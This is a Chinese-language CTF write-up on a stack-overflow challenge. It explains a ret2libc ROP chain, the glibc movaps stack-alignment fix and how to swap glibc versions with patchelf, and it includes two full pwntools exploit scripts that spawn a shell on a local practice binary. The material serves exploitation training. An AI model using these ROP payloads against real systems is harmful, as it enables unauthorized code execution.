# 【4】字节对齐与glibc

> 记录一下为什么要字节对齐，以及在编译的时候指定版本库和在运行时 `patchelf` 的过程

[题目以及相关内容链接](https://pan.baidu.com/s/1xfGWKGKwVqgGVzrc95zgjA?pwd=2333) 找 `blog4_blog4` 文件夹

## 题目信息

> 首先讲一道关于栈字节对齐的题目

### checksec

![image-20230204095624790](E:\Pictures\markdown\image-20230204095624790.png)

没有 **canary**，程序地址不变

### elf

![image-20230204095745967](E:\Pictures\markdown\image-20230204095745967.png)

输入即返回

![image-20230204100102940](E:\Pictures\markdown\image-20230204100102940.png)

执行情况

![image-20230225105426928](E:\Pictures\markdown\image-20230225105426928.png)

没有长度检查，手动输入来截断，十分简单的 **stackoverflow**，

![image-20230204101644336](E:\Pictures\markdown\image-20230204101644336.png)

但是这里需要注意一点，**stack 的长度并不是标准的偶数倍对齐**（姑且这么理解，在下文会谈及为什么要关注这个点，以及相关解决方案）

## 题解 1

操作就是很简单的栈溢出：

1. 构造 rop 链 `b'a'*(0xb + 0x8) + p64(bin_pop_rdi_ret) + p64(bin_puts_got) + p64(bin_puts_plt) + p64(bin_func_vuln)` 泄露 **bin_puts_got**
2. 利用末三位查表得对应 libc，再获取 libc 中 libc_puts_offset，libc_system_offset，libc_str_bin_sh_offset 的偏移，最后算出 libc_base
3. 利用上一步的 libc_base 构造 payload：`b'a'*(0xb + 0x8) + p64(bin_pop_rdi_ret) + p64(libc_str_bin_sh) + p64(libc_system)`，最后 getshell

但是，以上的方法直到构造最后的 payload 之前操作都是可行的，在构造完 payload 并测试时，部分版本的 Glibc 就会出现行不通的情况。在本实验环境 Kali Linux 2022 版中，使用 gdb 调试，发现程序在返回到 system 函数并执行时会卡在如图所示之处

<img src="E:\Pictures\markdown\image-20230225164623503.png" alt="image-20230225164623503" style="zoom:80%;" />

下图是 Kali 使用的 GLIBC 版本：

<img src="E:\Pictures\markdown\image-20230225164752668.png" alt="image-20230225164752668" style="zoom:80%;" />

在参考资料 3 中，有一段来自 guide 的话：

> **The MOVAPS issue**
> If you're segfaulting on a `movaps` instruction in `buffered_vfprintf()` or `do_system()` in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as `printf()` or `system()`. Some versions of GLIBC uses `movaps` instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a `call` instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. `movaps` triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra `ret` before returning into a function or return further into a function to skip a `push` instruction.

简要的意思就是，在一些版本的 GLIBC 中，要求堆栈在调用指令之前必须 16 字节对齐，使用 movaps 操作指令来检查该项是否符合标准，至于如何观察 **堆栈是否是 16 字节对齐**

<img src="E:\Pictures\markdown\image-20230226194342467.png" alt="image-20230226194342467" style="zoom:80%;" />

如图所示，确保当执行到这串汇编指令时，栈顶的值（图中 rsp 所指位置，也即 0x7ffe45a3a008）应该可以整除 16，这就要求rsp 中的值末位必须是 0（然而图中的是 8）。由于调用 do_system 函数中汇编指令已经定死，想要让程序运行到 movaps 的时候正好有一个 16 字节对齐的栈顶，最简单的方法就是在调用 do_system 之前 ret 一次，让栈顶再降低一次（每次降低会 +8）就行。

于是我们最后的 rop 链应当修改一下：`b'a'*(0xb + 0x8) + p64(bin_ret) + p64(bin_pop_rdi_ret) + p64(libc_str_bin_sh) + p64(libc_system)`

<img src="E:\Pictures\markdown\image-20230226195715774.png" alt="image-20230226195715774" style="zoom:80%;" />

最后成功 getshell

## 题解 2

当然需要拿一个低版本没有 movaps 对齐的 glibc 来作对比，此处需要到 **glibc all in one**、**patchelf** 相关补充内容，在文末会有相关介绍，此处不再赘述。

目前能够确定从 **glibc all in one** 里下下来的最旧的 glibc 版本 `2.23-0ubuntu3_amd64` 是没有 movaps 检查的，替换相应的 glibc 版本效果如图所示：

<img src="E:\Pictures\markdown\image-20230226201828770.png" alt="image-20230226201828770" style="zoom:80%;" />

对应的 rop 链就可以使用不加 ret 的版本了：`b'a'*(0xb + 0x8) + p64(bin_pop_rdi_ret) + p64(libc_str_bin_sh) + p64(libc_system)`

## EXP

> 高版本的 glibc，对应题解 1

```python
# -*- coding: utf-8 -*-

'''
[*] '/home/wkyuu/Desktop/temp/blog4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
'''

from pwn import *
import pwn

p64 = pwn.p64
u64 = pwn.u64

# context(log_level='debug', terminal=['tmux', 'splitw', '-h'])
context(log_level='debug')
fileName = './blog4'
p = process(fileName)
elf = ELF(fileName)

# bin
bin_func_main = elf.sym['main']
bin_func_vuln = elf.sym['vuln']
bin_puts_plt = elf.sym['puts']
bin_puts_got = elf.got['puts']
bin_pop_rdi_ret = 0x4012A3
bin_ret = 0x4012A4

# libc
# libc6-amd64_2.11.1-0ubuntu7.12_i386 根据自己的情况来修改
libc_puts = 0x77820
libc_system = 0x4c330
libc_str_bin_sh = 0x196031

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))

gdbscript = '''
b *vuln+36
b *vuln+55
c
c
c
'''
# gdb.attach(p, gdbscript=gdbscript)

# leak_libc
logger('leak_libc')
payload = b'a' * (0xb + 0x8) + p64(bin_pop_rdi_ret) + \
    p64(bin_puts_got) + p64(bin_puts_plt) + p64(bin_func_vuln)
p.sendlineafter(b'input sth:\n', payload)
p.recvuntil('\x0a')

leak_puts_got = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak_puts_got - libc_puts
libc_system = libc_base + libc_system
libc_str_bin_sh = libc_base + libc_str_bin_sh

logger('libc_base', hex(libc_base), 'success')
logger('leak_puts_got', hex(leak_puts_got), 'success')
logger('libc_system', hex(libc_system), 'success')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 'success')

# rop
logger('rop')
payload = b'b' * (0xb + 0x8) + p64(bin_ret) + p64(bin_pop_rdi_ret) + p64(libc_str_bin_sh) + p64(libc_system)
p.sendlineafter(b'input sth:\n', payload)
p.interactive()
```

> 较低版本的 glibc，对应题解2

```python
# -*- coding: utf-8 -*-

'''
[*] '/home/wkyuu/Desktop/temp/blog4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
'''

from pwn import *
import pwn

p64 = pwn.p64
u64 = pwn.u64

# context(log_level='debug', terminal=['tmux', 'splitw', '-h'])
context(log_level='debug')
fileName = './blog4'
p = process(fileName)
elf = ELF(fileName)

# bin
bin_func_main = elf.sym['main']
bin_func_vuln = elf.sym['vuln']
bin_puts_plt = elf.sym['puts']
bin_puts_got = elf.got['puts']
bin_pop_rdi_ret = 0x4012A3
bin_ret = 0x4012A4

# libc
# libc6_2.23-0ubuntu3_amd64 旧版本
libc_puts = 0x6f5d0
libc_system = 0x45380
libc_str_bin_sh = 0x18c58b

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))

gdbscript = '''
b *vuln+36
b *vuln+55
c
c
c
'''
# gdb.attach(p, gdbscript=gdbscript)

# leak_libc
logger('leak_libc')
payload = b'a' * (0xb + 0x8) + p64(bin_pop_rdi_ret) + \
    p64(bin_puts_got) + p64(bin_puts_plt) + p64(bin_func_vuln)
p.sendlineafter(b'input sth:\n', payload)
p.recvuntil('\x0a')

leak_puts_got = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak_puts_got - libc_puts
libc_system = libc_base + libc_system
libc_str_bin_sh = libc_base + libc_str_bin_sh

logger('libc_base', hex(libc_base), 'success')
logger('leak_puts_got', hex(leak_puts_got), 'success')
logger('libc_system', hex(libc_system), 'success')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 'success')

# rop
logger('rop')
payload = b'b' * (0xb + 0x8) + p64(bin_pop_rdi_ret) + p64(libc_str_bin_sh) + p64(libc_system)
p.sendlineafter(b'input sth:\n', payload)
p.interactive()
```

## GLIBC 与 Interpreter

> 在编译本题目的时候要指定某版本的 **glibc**，经过查找资料以后，大概有一些眉目了，下面是个人的思考和想法。

### GLIBC

> 这是来源于[官网](https://www.gnu.org/software/libc/started.html)的介绍：
>
> > ## Getting started using glibc
> >
> > The GNU C Library provides many of the low-level components used directly by programs written in the C or C++ languages. Many programming languages use the GNU C Library indirectly including C#, Java, Perl, Python, and Ruby (interpreters, VMs, or compiled code for these languages use glibc directly).
> >
> > In the simplest case the program uses the glibc provided by the distribution, but you aren't limited to this. Perhaps you want to test a new feature, or a developer has asked if you can reproduce the bug with the latest glibc.
> >
> > Whatever your needs are, these intructions are designed to guide you through the process of building and using upstream glibc.

<img src="E:\Pictures\markdown\image-20221128211536110.png" alt="image-20221128211536110" style="zoom:67%;" />

`libc.so.6`，也就是 **glibc** 的软链接表示，是 **Linux** 系统中最底层的 **api**，几乎任何运行库都将依赖于 **glibc**，在这里可以片面的理解为

<img src="E:\Pictures\markdown\image-20221128212139954.png" alt="image-20221128212139954" style="zoom:67%;" />

这里的 **libc6_2.23-0ubuntu2_amd64.so** 就是从 [pwn 题常用 libc 库查询](https://libc.rip) 拿下来的，有的时候有些题目也会给你供应一个 **libc.so.6**

<img src="E:\Pictures\markdown\image-20221128212320223.png" alt="image-20221128212320223" style="zoom: 50%;" />

查看自己系统中的 **libc.so.6** 可以发现，确实有两个不同的 **libc.so.6**，分别应用于 **32位** 和 **64位** 应用

<img src="E:\Pictures\markdown\image-20221128213120365.png" alt="image-20221128213120365" style="zoom:67%;" />

然后不同的 **libc.so.6** 内含有的版本也不尽相同（左边的只是名字不同，可以使用创建软链接的方式让它成为 **libc.so.6**：`ln -s /path/to/libc6_2.27.so /usr/x86_64-linux-gnu/libc.so.6`），下图中右边的是本机 **kali** 中的，属于较高版本

<img src="E:\Pictures\markdown\image-20221128212948006.png" alt="image-20221128212948006" style="zoom:67%;" />

由于 **glibc** 总要升级，而且每次的名字还不一样，然而在使用应用的时候就**一定**要调用这个 **glibc**，为了能保持更新，就约定应用只需要向系统询问 **libc.so.6** 的位置以及相应的可执行文件

而在每次更新完 **glibc** 以后，创建一个软链接指向这个 **libc.so.6** 即可（当然，如果不创建软链接，也可以直接把更新好的 **glibc** 放到相应目录，并且改名成 **libc.so.6**）

这样就保证 **应用** 能调用得上 **libc.so.6**，而 **系统** 也能保持对 **glibc** 的更新

### Interpreter

举个例子，如下图所示

![image-20221129110056984](E:\Pictures\markdown\image-20221129110056984.png)

可以将 **Interpreter** 看作一个程序运行的解释器，其本身的作用是为程序提供**动态链接**（即按照程序给的需求来链接所需的 **libc.so**）并作为一个应用启动器来启动后续传入的应用

可以类比：`./elf` 和 `/bin/sh ./elf`

### 打题相关

可以手动指定应用在运行时加载的 **glibc** 和 **interpreter**：

1. 在命令行中运行：`LD_PRELOAD=<想要加载的 so 位置> <文件位置>`，例如，`LD_PRELOAD=./libc6_2.27.so ./pwn`

2. 打题目必用组件，**patchelf**（使用 `sudo apt install patchelf` 来安装）：

  `patchelf --set-interpreter <ld-libc.so.2> ./pwn`，例如，`patchelf --set-interpreter ./ld-libc_2.27.so.2 ./pwn`

  `patchelf --replace-needed libc.so.6 <libc.so.6> ./pwn`，例如，`patchelf --replace-needed libc.so.6 ./libc6_2.27.so ./pwn`

  然后使用 `ldd ./pwn` 来查看更新后的 **glibc** 和 **interpreter** 信息

  <img src="E:\Pictures\markdown\image-20221129111938568.png" alt="image-20221129111938568" style="zoom: 80%;" />

3. 在 **python** 中加载相应的路径：`p = process(['/lib64/ld-2.23.so',  './pwn'], env={'LD_PRELOAD': './libc6_2.27.so'})`

### glic all in one

> 为你提供相应的 **libc.so.6** 对应的 **ld-libc.so**

1. 首先获取这个仓库：`git clone https://github.com/matrix1001/glibc-all-in-one.git`

2. 相关配置：

	1. 进入目录：`cd glibc-all-in-one`

	2. 获取列表：`./update_list && cat list`

		<img src="E:\Pictures\markdown\image-20221129112846931.png" alt="image-20221129112846931" style="zoom:67%;" />

	3. 下载对应版本的 **glibc** 相关：`./download 2.23-0ubuntu3_amd64`，这里的 **2.23-0ubuntu3_amd64** 可以从 **libc6_2.23-0ubuntu3_amd64.so** 这个名字中得到，这个 **0ubuntu3**，**0ubuntu2** 是进阶关系的

	4. 下载好的 **glibc** 放在 **./libs** 目录里，然后复制或生成软链接一份到相应位置：

		1. `cd ./libs/2.23-0ubuntu3_amd64`
		2. `cp ./ld-2.23.so /lib64/ld-2.23.so`，这个是添加到全局目录了，以后就不用再添加相同的 **interpreter**

	5. 开始 **patchelf**：

		1. 添加解释器：`patchelf --set-interpreter /lib64/ld-2.23.so ./pwn`
		2. 修改 **libc.so.6**：`patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so ./pwn`

	6. 然后可以使用 `ldd ./pwn` 来查看更新过 **glibc** 后的文件加载信息

## 参考链接 | References

1. [What differences and relations are between the various libc.so?](https://unix.stackexchange.com/questions/449107/what-differences-and-relations-are-between-the-various-libc-so)
2. [16 Bytes Stack Alignment 的 MOVAPS 問題](https://hack543.com/16-bytes-stack-alignment-movaps-issue/)
3. [Beginners' guide](https://ropemporium.com/guide.html#Common pitfalls)
5. [What is /lib64/ld-linux-x86-64.so.2 and why can it be used to execute file?](https://unix.stackexchange.com/questions/400621/what-is-lib64-ld-linux-x86-64-so-2-and-why-can-it-be-used-to-execute-file)
6. [How programs get run: ELF binaries (程序是怎样运行的)](https://lwn.net/Articles/631631/)